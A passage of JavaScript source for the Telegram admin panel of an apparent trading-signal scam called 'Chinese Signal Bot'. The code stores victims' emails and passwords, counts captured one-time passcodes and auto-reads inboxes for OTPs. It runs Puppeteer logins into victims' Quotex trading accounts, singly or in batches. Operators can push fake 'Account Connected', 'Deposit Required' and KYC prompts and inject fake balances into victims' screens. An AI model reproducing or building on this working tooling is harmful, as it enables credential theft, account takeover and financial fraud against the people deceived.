        return tgApi('sendPhoto', { chat_id: chatId, photo: `data:image/jpeg;base64,${session.screenshotBase64.replace(/^data:image\/\w+;base64,/, '')}`, caption: `📸 ${session.clientName} — ${session.status}` }).catch(async () => {
            return tgApi('sendMessage', { chat_id: chatId, text: `📸 Screenshot available for ${session.clientName} (${session.status}) — view in admin panel.` });
        });
    }

    // ── RETRY CONFIG ─────────────────────────────────────────────────
    if (action === 'retry_on' || action === 'retry_off') {
        autoRetryConfig.enabled = action === 'retry_on';
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: autoRetryConfig.enabled ? '✅ Auto-Retry <b>ENABLED</b>' : '⚪ Auto-Retry <b>DISABLED</b>',
            reply_markup: tgRetryConfigKeyboard() });
    }
    if (action === 'retry_ask_attempts') {
        tgSessions[chatId] = { awaiting: 'retry_attempts' };
        return tgApi('sendMessage', { chat_id: chatId, text: `🔁 Enter max retry attempts (1-10): current=${autoRetryConfig.maxAttempts}` });
    }
    if (action === 'retry_ask_delay') {
        tgSessions[chatId] = { awaiting: 'retry_delay' };
        return tgApi('sendMessage', { chat_id: chatId, text: `⏱️ Enter retry delay in seconds (5-300): current=${autoRetryConfig.delaySeconds}` });
    }

    // ── CREDENTIALS ACTIONS ───────────────────────────────────────────
    if (action === 'cred_add') {
        tgSessions[chatId] = { awaiting: 'cred_email' };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '➕ <b>Add Saved Credential</b>\n\n📧 Send the Email address:' });
    }
    if (action === 'cred_batch_all') {
        const allCreds = useDatabase
            ? await SavedCredential.find({}).lean().catch(() => [])
            : savedCredsMemory;
        if (!allCreds.length) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ No saved credentials.' });
        let launched = 0;
        for (const c of allCreds) {
            const existing = [...quotexSessions.values()].find(s => s.email === c.email && !['closed','error','logged_in'].includes(s.status));
            if (existing) continue;
            const sid = makeSessionId();
            const session = { id: sid, clientName: c.label || c.email.split('@')[0], email: c.email, password: c.password,
                licenceKey: '', status: 'queued', statusMsg: 'Batch launched from Telegram', startedAt: new Date(), updatedAt: new Date(),
                otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
            quotexSessions.set(sid, session);
            broadcastSSE('qx_session_new', getSessionInfo(session));
            launchQuotexSession(session).catch(e => console.error('batch launch error:', e.message));
            launched++;
            await sleep(800);
        }
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🚀 <b>Batch Launch Complete</b>\nLaunched <b>${launched}</b> sessions.` });
    }
    if (action === 'cred_action') {
        const credId = parts[1];
        const creds  = useDatabase ? await SavedCredential.find({}).lean().catch(() => []) : savedCredsMemory;
        const cred   = creds.find(c => c.id === credId);
        if (!cred) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Credential not found.' });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔑 <b>${cred.label || cred.email}</b>\n📧 <code>${cred.email}</code>\nGroup: <b>${cred.group}</b>\nLaunches: <b>${cred.launchCount || 0}</b>`,
            reply_markup: tgCredActionKeyboard(credId) });
    }
    if (action === 'cred_launch') {
        const credId = parts[1];
        const creds  = useDatabase ? await SavedCredential.find({}).lean().catch(() => []) : savedCredsMemory;
        const cred   = creds.find(c => c.id === credId);
        if (!cred) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Credential not found.' });
        const existing = [...quotexSessions.values()].find(s => s.email === cred.email && !['closed','error','logged_in'].includes(s.status));
        if (existing) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ Session already <b>${existing.status}</b> for <code>${cred.email}</code>` });
        const sid = makeSessionId();
        const session = { id: sid, clientName: cred.label || cred.email.split('@')[0], email: cred.email, password: cred.password,
            licenceKey: '', status: 'queued', statusMsg: 'Launched from saved credential', startedAt: new Date(), updatedAt: new Date(),
            otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
        quotexSessions.set(sid, session);
        broadcastSSE('qx_session_new', getSessionInfo(session));
        launchQuotexSession(session).catch(e => console.error('cred launch error:', e.message));
        // Update launch count
        if (useDatabase) { SavedCredential.findOneAndUpdate({ id: credId }, { lastLaunched: new Date(), $inc: { launchCount: 1 } }).catch(() => {}); }
        else { const c = savedCredsMemory.find(x => x.id === credId); if (c) { c.lastLaunched = new Date(); c.launchCount = (c.launchCount || 0) + 1; } }
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🚀 Launching <b>${session.clientName}</b>\nSession: <code>${sid}</code>`,
            reply_markup: tgSessionKeyboard(sid, 'queued') });
    }
    if (action === 'cred_delete') {
        const credId = parts[1];
        if (useDatabase) { await SavedCredential.deleteOne({ id: credId }).catch(() => {}); }
        else { savedCredsMemory = savedCredsMemory.filter(c => c.id !== credId); }
        return tgApi('sendMessage', { chat_id: chatId, text: '🗑️ Credential deleted.' });
    }

    // ── ORDERS STATUS UPDATE ─────────────────────────────────────────
    if (action === 'order_status') {
        const orderId   = parts[1];
        const newStatus = parts[2];
        if (!['New','Contacted','Paid','Completed','Rejected'].includes(newStatus)) return;
        try {
            if (useDatabase) { await Order.findOneAndUpdate({ id: orderId }, { status: newStatus }); }
            else { const o = ordersMem.find(x => x.id === orderId); if (o) { o.status = newStatus; saveOrdersFile(); } }
            broadcastSSE('order_updated', { id: orderId, status: newStatus });
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                text: `✅ Order <code>${orderId}</code> → <b>${newStatus}</b>` });
        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
    }

    // ── SETTINGS MENU ACTIONS ─────────────────────────────────────────
    if (action === 'settings_ask_tg') {
        tgSessions[chatId] = { awaiting: 'settings_tg_url' };
        return tgApi('sendMessage', { chat_id: chatId, text: '🔗 Send new Telegram Group URL (or "clear"):' });
    }
    if (action === 'settings_ask_wa') {
        tgSessions[chatId] = { awaiting: 'settings_wa_url' };
        return tgApi('sendMessage', { chat_id: chatId, text: '🔗 Send new WhatsApp URL (or "clear"):' });
    }
    if (action === 'settings_ask_name') {
        tgSessions[chatId] = { awaiting: 'settings_bot_name' };
        return tgApi('sendMessage', { chat_id: chatId, text: '✏️ Send new bot display name:' });
    }
    if (action === 'settings_retry_menu') {
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `⚙️ <b>Auto-Retry Config</b>\nEnabled: <b>${autoRetryConfig.enabled}</b>\nMax Attempts: <b>${autoRetryConfig.maxAttempts}</b>\nDelay: <b>${autoRetryConfig.delaySeconds}s</b>`,
            reply_markup: tgRetryConfigKeyboard() });
    }

    // ── LICENSE ACTIONS ──────────────────────────────────────────────
    if (action === 'lic_add') {
        tgSessions[chatId] = { awaiting: 'lic_key' };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '🔑 <b>Add License</b>\nSend the license key (e.g. CSAI-XXXX-XXXX-XXXX):' });
    }
    if (action === 'lic_revoke_ask') {
        tgSessions[chatId] = { awaiting: 'lic_revoke' };
        return tgApi('sendMessage', { chat_id: chatId, text: '🚫 Send the license key to revoke (set Inactive):' });
    }
    if (action === 'lic_activate_ask') {
        tgSessions[chatId] = { awaiting: 'lic_activate' };
        return tgApi('sendMessage', { chat_id: chatId, text: '✅ Send the license key to activate:' });
    }


    // ── Note-taking via Telegram ─────────────────────────────────────────
    if (action === 'ask_note') {
        tgSessions[chatId] = { awaiting: 'note', target };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📝 <b>Add Note for ${target}</b>\nSend the note text (/cancel to abort):` });
    }

    // ── Launch QX directly from user profile (uses stored creds) ─────────
    if (action === 'qxlaunch_user') {
        const foundUser = await tgFindUserByName(target);
        if (!foundUser || !foundUser.username || !foundUser.password) {
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                text: `⚠️ <b>${target}</b> has no stored credentials yet.\nAsk them to submit their login first.` });
        }
        if (!puppeteerAvailable) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Puppeteer not installed — Auto-Login disabled.' });
        const existing = [...quotexSessions.values()].find(s =>
            s.email === foundUser.username && !['closed','error','logged_in'].includes(s.status));
        if (existing) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `⚠️ Session already <b>${existing.status}</b> for <code>${foundUser.username}</code>` });
        const sid     = makeSessionId();
        const session = { id: sid, clientName: foundUser.fullName || target, email: foundUser.username,
            password: foundUser.password, licenceKey: foundUser.licenceKey || '',
            status: 'queued', statusMsg: 'Launched via Telegram user profile', startedAt: new Date(),
            updatedAt: new Date(), otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
        quotexSessions.set(sid, session);
        broadcastSSE('qx_session_new', getSessionInfo(session));
        launchQuotexSession(session).catch(e => console.error('qxlaunch_user error:', e.message));
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🚀 Launching QX for <b>${session.clientName}</b>\nSession: <code>${sid}</code>`,
            reply_markup: tgSessionKeyboard(sid, 'queued') });
    }

    // ── Inline license type confirmation ─────────────────────────────────
    if (action === '_lic_do') {
        const licKey  = decodeURIComponent(parts[1] || '');
        const licType = parts[2] || 'Standard';
        try {
            if (useDatabase) {
                if (await dbFindLicense(licKey)) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ License <code>${licKey}</code> already exists.` });
                await dbInsertLicense({ key: licKey, type: licType, status: 'Active' });
            } else {
                if (licenses.find(l => l.key === licKey)) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ License <code>${licKey}</code> already exists.` });
                licenses.unshift({ key: licKey, type: licType, status: 'Active', usesRemaining: null, assignedTo: null, dateAdded: new Date().toISOString(), expiry: null });
                saveLicenses();
            }
            broadcastSSE('license_added', { key: licKey, type: licType, status: 'Active' });
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                text: `✅ License added!\n🔑 Key: <code>${licKey}</code>\nType: <b>${licType}</b>` });
        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
    }

    // ── User action callbacks ──────────────────────────────
    if (action === 'qt') {
        const trig = QUICK_TRIGGERS[parts[1]];
        if (!trig) return;
        await tgInjectMessage(target, trig.type, trig.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Sent <b>${parts[1]}</b> to <b>${target}</b>` });
    }
    if (action === 'ask_msg') {
        tgSessions[chatId] = { awaiting: 'custom_msg', target };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `💬 Send the message text for <b>${target}</b>:\n(/cancel to abort)` });
    }
    if (action === 'ask_balance') {
        tgSessions[chatId] = { awaiting: 'balance', target };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `💰 Send the balance amount for <b>${target}</b>:\n(/cancel to abort)` });
    }
    if (action === 'tc_trigger') {
        const tcUser = decodeURIComponent(parts[1] || '');
        sendSSEToUser(tcUser, 'show_connected',    { userName: tcUser });
        sendSSEToUser(tcUser, 'trigger_connected', { userName: tcUser });
        await sendTelegramMessage(`🔗 <b>Trigger Connected</b> fired\n👤 User: <b>${tcUser}</b>`);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `✅ <b>Trigger Connected</b> sent to <b>${tcUser}</b>\n🔗 Their bot session now shows "Account Connected".`,
            reply_markup: tgUserActionKeyboard(tcUser) });
    }

    if (action === 'force_reload') {
        const ok = sendSSEToUser(target, 'force_reload', { timestamp: new Date().toISOString() });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: ok ? `🔄 Force-reloaded <b>${target}</b>` : `⚠️ <b>${target}</b> is not online.` });
    }
    if (action === 'push_loading') {
        const ok = sendSSEToUser(target, 'show_loading', { message: 'Please wait...', seconds: 5 });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: ok ? `⏳ Loading shown to <b>${target}</b>` : `⚠️ <b>${target}</b> is not online.` });
    }
    if (action === 'kick') {
        const k = target.trim().toLowerCase();
        const client = sseUserClients.get(k);
        if (client) {
            try { client.write(`data: ${JSON.stringify({ type: 'kicked', data: { message: 'Session ended by admin.' } })}\n\n`); setTimeout(() => { try { client.end(); } catch(e){} }, 300); } catch(e) {}
            sseClients.delete(client); sseUserClients.delete(k);
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `👢 Kicked <b>${target}</b>` });
        }
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ <b>${target}</b> is not online.` });
    }
    if (action === 'block' || action === 'unblock') {
        const u = await tgFindUserByName(target);
        if (!u?.licenceKey) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ User <b>${target}</b> not found.` });
        try {
            await axios.post(`http://127.0.0.1:${process.env.PORT || 3000}/api/${action}-user`, { licenceKey: u.licenceKey });
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                text: `${action === 'block' ? '🚫 Blocked' : '✅ Unblocked'} <b>${target}</b>` });
        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
    }
}

async function tgCmdHelp(chatId) {
    const helpText = `🤖 <b>Chinese Signal Bot — Full Command Reference</b>

<b>━━━ NAVIGATION ━━━</b>
/start /menu — Main menu keyboard
/users — User management
/inject — Message injection menu
/maint — Maintenance mode
/creds — Auto-Login credentials
/orders — Orders management
/licenses /lic — License management
/settings — Bot settings
/online — Show online users
/stats — Bot statistics
/qx — Active Quotex sessions

<b>━━━ USER ACTIONS ━━━</b>
Send any <b>username</b> → user action keyboard
/block &lt;name&gt; — Block user
/unblock &lt;name&gt; — Unblock user
/kick &lt;name&gt; — Disconnect user session
/reload &lt;name&gt; — Force-reload user's page

<b>━━━ QUICK TRIGGERS ━━━</b>
/tc &lt;name&gt; — 🔗 Trigger Account Connected (LIVE)
/connected &lt;name&gt; — Account connected message
/lowbal &lt;name&gt; — ⚠️ Low Balance Warning ($30)
/deposit &lt;name&gt; — 💰 Deposit Required prompt
/signal &lt;name&gt; — 📡 Signal Incoming
/close &lt;name&gt; — 🔔 Close Position signal
/alert &lt;name&gt; — 🚨 Account Alert
/wait &lt;name&gt; — ⏳ Please Wait message
/kyc &lt;name&gt; — 📄 KYC Verification required
/msg &lt;name&gt; &lt;text&gt; — 💬 Custom message
/balance &lt;name&gt; &lt;amount&gt; — 💰 Inject balance

<b>━━━ ALL TRIGGER KEYS ━━━</b>
/triggers — List all trigger keys
/qt &lt;name&gt; &lt;key&gt; — Fire any trigger by key name
/tc &lt;name&gt; — Live "Trigger Connected" (SSE)

<b>━━━ BROADCAST ━━━</b>
/broadcast &lt;text&gt; — Broadcast to all users

<b>━━━ MAINTENANCE ━━━</b>
/maint — Toggle + set duration (30m/1h/2h/6h/24h)

<b>━━━ AUTO-OTP ━━━</b>
/autootp — Toggle auto-OTP on/off (reads inbox automatically)
/autootp on — Enable auto-OTP
/autootp off — Disable auto-OTP
/otpstatus — Show auto-OTP status &amp; config

<b>━━━ AUTO-LOGIN (QUOTEX) ━━━</b>
/qxlaunch &lt;email&gt; &lt;pass&gt; [name] — Start Quotex login
/otp &lt;sessionId&gt; &lt;code&gt; — Submit OTP
/qxclose &lt;sessionId&gt; — Close session
/qx — View all sessions
/retry — Auto-retry config
`;
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: helpText, reply_markup: tgMainMenuKeyboard() });
}
async function tgCmdStats(chatId) {
    try {
        const s = useDatabase ? await dbGetStats() : {
            totalUsers: users.length, onlineNow: sseClients.size,
            otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
            connectedAccounts: users.filter(u => u.connected).length,
            totalLicenses: licenses.length, activeLicenses: licenses.filter(l => l.status === 'Active').length,
            blockedUsers: users.filter(u => u.blocked).length,
        };
        const activeSessions = [...quotexSessions.values()].filter(s => !['closed','error'].includes(s.status)).length;
        const loggedIn = [...quotexSessions.values()].filter(s => s.status === 'logged_in').length;
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
            `📊 <b>Bot Stats</b>\n👥 Total Users: <b>${s.totalUsers}</b>\n🟢 Online: <b>${s.onlineNow}</b>\n` +
            `🔢 OTPs Captured: <b>${s.otpCaptured}</b>\n🔗 Connected: <b>${s.connectedAccounts}</b>\n` +
            `🔑 Licenses: <b>${s.totalLicenses}</b> (Active: ${s.activeLicenses})\n🚫 Blocked: <b>${s.blockedUsers}</b>\n\n` +
            `🤖 <b>Quotex Sessions</b>\n🔓 Active: <b>${activeSessions}</b> | ✅ Logged in: <b>${loggedIn}</b>` });
    } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
}

async function tgCmdOnline(chatId) {
    const names = [...sseUserClients.keys()];
    if (!names.length) return tgApi('sendMessage', { chat_id: chatId, text: '⚪ No users online right now.' });
    const list = names.slice(0, 40).map((n, i) => `${i + 1}. <code>${n}</code>`).join('\n');
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: `🟢 <b>Online Users (${names.length})</b>\n${list}\n\nSend a username to manage.` });
}

async function tgCmdQxSessions(chatId) {
    const sessions = [...quotexSessions.values()];
    if (!sessions.length) return tgApi('sendMessage', { chat_id: chatId, text: '⚪ No Quotex sessions.' });
    const STATUS_EMOJI = { launching:'🚀', navigating:'🌐', filling:'✍️', waiting_otp:'🔢', submitting_otp:'⏳', logged_in:'✅', wrong_otp:'❌', error:'❌', closed:'⚫' };
    const lines = sessions.map((s, i) =>
        `${i+1}. ${STATUS_EMOJI[s.status] || '❓'} <b>${s.clientName}</b> — ${s.email}\n` +
        `   Status: <b>${s.status}</b> | ID: <code>${s.id}</code>`
    ).join('\n\n');
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
        `🤖 <b>Quotex Sessions (${sessions.length})</b>\n\n${lines}\n\n` +
        `Use /otp &lt;id&gt; &lt;code&gt; to submit OTP\nUse /qxclose &lt;id&gt; to close` });
}


async function tgCmdUsersMenu(chatId) {
    const names = [...sseUserClients.keys()];
    if (!names.length) {
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '⚪ No users online right now.',
            reply_markup: tgBackKeyboard() });
    }
    const kb = names.slice(0, 12).map(n => ([{ text: `🟢 ${n}`, callback_data: `user_action|${encodeURIComponent(n)}` }]));
    kb.push([{ text: '🔙 Back', callback_data: 'menu' }]);
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: `👥 <b>Online Users (${names.length})</b>\nTap a user to manage:`,
        reply_markup: { inline_keyboard: kb } });
}

async function tgCmdInjectMenu(chatId) {
    const names = [...sseUserClients.keys()];
    if (!names.length) {
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '⚪ No users online to inject messages to.',
            reply_markup: tgBackKeyboard() });
    }
    const kb = names.slice(0, 12).map(n => ([{ text: `💬 ${n}`, callback_data: `inject_type_menu|${encodeURIComponent(n)}` }]));
    kb.push([{ text: '📢 Broadcast to All', callback_data: 'menu_broadcast' }]);
    kb.push([{ text: '🔙 Back', callback_data: 'menu' }]);
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: `💬 <b>Inject Message</b>\nSelect target user:`,
        reply_markup: { inline_keyboard: kb } });
}

async function tgCmdLicensesMenu(chatId) {
    try {
        const all = useDatabase ? await dbGetAllLicenses() : licenses;
        const active   = all.filter(l => l.status === 'Active').length;
        const inactive = all.filter(l => l.status !== 'Active').length;
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔑 <b>Licenses</b>\n📊 Total: <b>${all.length}</b> | ✅ Active: <b>${active}</b> | 🚫 Inactive: <b>${inactive}</b>`,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➕ Add License',     callback_data: 'lic_add' },
                     { text: '🚫 Revoke License',  callback_data: 'lic_revoke_ask' }],
                    [{ text: '✅ Activate License', callback_data: 'lic_activate_ask' }],
                    [{ text: '🔙 Back', callback_data: 'menu' }],
                ]
            }
        });
    } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
}

async function tgCmdOrdersMenu(chatId) {
    try {
        const all = useDatabase ? await Order.find({}).sort({ createdAt: -1 }).limit(5).lean() : ordersMem.slice(0, 5);
        if (!all.length) {
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                text: '📦 No orders yet.', reply_markup: tgBackKeyboard() });
        }
        const STATUS_ICONS = { New:'🆕', Contacted:'📞', Paid:'💰', Completed:'✅', Rejected:'❌' };
        const lines = all.map((o, i) =>
            `${i+1}. ${STATUS_ICONS[o.status]||'❓'} <b>${o.fullName}</b> — ${o.planLabel||o.planKey} (${o.paymentMethod})\nID: <code>${o.id}</code>`
        ).join('\n\n');
        const kb = all.flatMap(o => {
            const s = encodeURIComponent(o.id);
            return [[
                { text: `✅ Paid: ${o.id.slice(-6)}`,   callback_data: `order_status|${o.id}|Paid` },
                { text: `✔️ Done: ${o.id.slice(-6)}`,   callback_data: `order_status|${o.id}|Completed` },
                { text: `❌ Reject: ${o.id.slice(-6)}`, callback_data: `order_status|${o.id}|Rejected` },
            ]];
        });
        kb.push([{ text: '🔙 Back', callback_data: 'menu' }]);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📦 <b>Latest Orders</b>\n\n${lines}`,
            reply_markup: { inline_keyboard: kb } });
    } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
}

async function tgCmdSettingsMenu(chatId) {
    const s = botSettings;
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: `⚙️ <b>Bot Settings</b>\n📛 Name: <b>${s.botName||'—'}</b>\n📱 Telegram: <code>${s.telegramUrl||'—'}</code>\n💬 WhatsApp: <code>${s.whatsappUrl||'—'}</code>`,
        reply_markup: {
            inline_keyboard: [
                [{ text: '✏️ Bot Name',        callback_data: 'settings_ask_name' },
                 { text: '📱 Telegram URL',    callback_data: 'settings_ask_tg' }],
                [{ text: '💬 WhatsApp URL',    callback_data: 'settings_ask_wa' },
                 { text: '🔄 Auto-Retry CFG',  callback_data: 'settings_retry_menu' }],
                [{ text: '🔙 Back', callback_data: 'menu' }],
            ]
        }
    });
}

async function tgCmdMaintenanceMenu(chatId) {
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: `🔧 <b>Maintenance Mode</b>\nStatus: <b>${maintenanceMode.active ? '🔴 ON' : '🟢 OFF'}</b>\nMessage: ${maintenanceMode.message}`,
        reply_markup: tgMaintenanceKeyboard(maintenanceMode.active) });
}

async function tgCmdCredsMenu(chatId) {
    const creds = useDatabase ? await SavedCredential.find({}).lean().catch(() => []) : savedCredsMemory;
    if (!creds.length) {
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '📋 <b>Saved Credentials</b>\nNo credentials saved yet.',
            reply_markup: { inline_keyboard: [[{ text: '➕ Add Credential', callback_data: 'cred_add' }],[{ text: '🔙 Back', callback_data: 'menu' }]] } });
    }
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: `📋 <b>Saved Credentials (${creds.length})</b>\nTap to manage:`,
        reply_markup: tgCredsKeyboard(creds) });
}

async function tgHandleMessage(msg) {
    const chatId = msg.chat.id;
    const text0  = (msg.text || '').trim();

    // ── /start handler — works for ALL users (admin + regular) ──────────
    if (text0 === '/start') {
        const REQUIRED_CHANNEL = process.env.REQUIRED_CHANNEL || '@A_ToolsX';
        const BOT_URL          = process.env.BOT_URL || '';

        // Admin always gets the admin panel directly
        if (String(chatId) === String(TELEGRAM_CHAT_ID)) {
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                reply_markup: tgMainMenuKeyboard(),
                text: '🤖 <b>Chinese Signal Bot — Admin Control</b>\n\nSend a <b>username</b> to manage that user, or pick an option.' });
        }

        // For regular users: check channel membership
        try {
            const memberResp = await tgApi('getChatMember', { chat_id: REQUIRED_CHANNEL, user_id: chatId });
            const status     = memberResp?.result?.status;
            const isMember   = ['member', 'administrator', 'creator', 'restricted'].includes(status);

            if (isMember) {
                return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                    text: `✅ <b>Welcome!</b> You are a verified channel member.\n\n` +
                          (BOT_URL
                              ? `🔗 Access the trading bot here:\n${BOT_URL}`
                              : `📩 Contact the admin to receive your access link.`) });
            } else {
                return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [[{ text: '📢 Join Channel Now', url: `https://t.me/${REQUIRED_CHANNEL.replace('@', '')}` }]] },
                    text: `🚀 <b>To use this bot, you must join our channel:</b>\n` +
                          `https://t.me/${REQUIRED_CHANNEL.replace('@', '')}\n\n` +
                          `✅ After joining, send /start again.` });
            }
        } catch(e) {
            // getChatMember failed — bot is likely not a channel admin.
            // Add the bot as an admin of the channel so membership checks work.
            // For now, fall through gracefully.
            console.warn('getChatMember failed (is the bot a channel admin?):', e.message);
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                text: `✅ <b>Welcome!</b>` +
                      (BOT_URL ? `\n\n🔗 Access the bot here:\n${BOT_URL}` : `\n\n📩 Contact the admin for your access link.`) });
        }
    }
    // ────────────────────────────────────────────────────────────────────

    if (String(chatId) !== String(TELEGRAM_CHAT_ID)) {
        return tgApi('sendMessage', { chat_id: chatId, text: '⛔ Unauthorized.' });
    }
    const text = (msg.text || '').trim();
    if (!text) return;

    const sess = tgSessions[chatId];
    if (text === '/cancel') { delete tgSessions[chatId]; return tgApi('sendMessage', { chat_id: chatId, text: '❎ Cancelled.' }); }

    // ── OTP input flow ────────────────────────────────────
    if (sess?.awaiting === 'qx_otp' && sess.sessionId) {
        delete tgSessions[chatId];
        const otp = text.replace(/\D/g, '').slice(0, 8);
        if (!otp) return tgApi('sendMessage', { chat_id: chatId, text: '❌ Invalid OTP. Send digits only.' });
        const result = await submitQuotexOTP(sess.sessionId, otp);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: result.ok
                ? `✅ OTP accepted! Logging in <b>${sess.clientName}</b>...`
                : `❌ ${result.message || result.error}` });
    }

    if (sess?.awaiting === 'custom_msg' && sess.target) {
        delete tgSessions[chatId];
        await tgInjectMessage(sess.target, 'info', text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Sent to <b>${sess.target}</b>` });
    }
    if (sess?.awaiting === 'balance' && sess.target) {
        delete tgSessions[chatId];
        const bal = text.replace(/[^\d.\-]/g, '');
        const ok  = sendSSEToUser(sess.target, 'inject_balance', { balance: bal });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: ok ? `💰 Injected <b>${bal}</b> for <b>${sess.target}</b>` : `⚠️ <b>${sess.target}</b> offline.` });
    }
    if (sess?.awaiting === 'broadcast_text') {
        delete tgSessions[chatId];
        broadcastSSE('broadcast_message', { message: text, type: 'info', timestamp: new Date().toISOString() });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📢 Broadcast sent to <b>${sseClients.size}</b> clients.` });
    }
    if (sess?.awaiting === 'qxlaunch_email') {
        tgSessions[chatId] = { ...sess, awaiting: 'qxlaunch_password', email: text };
        return tgApi('sendMessage', { chat_id: chatId, text: '🔑 Now send the Password:' });
    }
    if (sess?.awaiting === 'qxlaunch_password') {
        tgSessions[chatId] = { ...sess, awaiting: 'qxlaunch_name', password: text };
        return tgApi('sendMessage', { chat_id: chatId, text: "👤 Now send the Client's Full Name (or type 'skip'):" });
    }
    if (sess?.awaiting === 'qxlaunch_name') {
        delete tgSessions[chatId];
        const clientName = text === 'skip' ? 'Client' : text;
        const sid = makeSessionId();
        const session = { id: sid, clientName, email: sess.email, password: sess.password, licenceKey: '',
            status: 'queued', statusMsg: 'Queued', startedAt: new Date(), updatedAt: new Date(),
            otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
        quotexSessions.set(sid, session);
        broadcastSSE('qx_session_new', getSessionInfo(session));
        launchQuotexSession(session).catch(e => console.error('launch error:', e.message));
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🚀 Launching Quotex login for <b>${clientName}</b>...\nSession: <code>${sid}</code>` });
    }

    // ── Direct commands ───────────────────────────────────

    if (text === '/users')   return tgCmdUsersMenu(chatId);
    if (text === '/inject')  return tgCmdInjectMenu(chatId);
    if (text === '/maint')   return tgCmdMaintenanceMenu(chatId);
    if (text === '/creds')   return tgCmdCredsMenu(chatId);
    if (text === '/orders')  return tgCmdOrdersMenu(chatId);
    if (text === '/licenses' || text === '/lic') return tgCmdLicensesMenu(chatId);
    if (text === '/settings') return tgCmdSettingsMenu(chatId);
    if (text === '/retry')   return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: `⚙️ <b>Auto-Retry Config</b>\nEnabled: <b>${autoRetryConfig.enabled}</b>\nMax: <b>${autoRetryConfig.maxAttempts}</b>\nDelay: <b>${autoRetryConfig.delaySeconds}s</b>`,
        reply_markup: tgRetryConfigKeyboard() });

    // /autootp — toggle auto-OTP watcher on/off
    if (text === '/autootp' || text === '/autootp on' || text === '/autootp off') {
        if (!imapflowAvailable) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '⚠️ <b>imapflow not installed</b>\n\nRun this on your server:\n<code>npm install imapflow</code>\nThen restart.' });
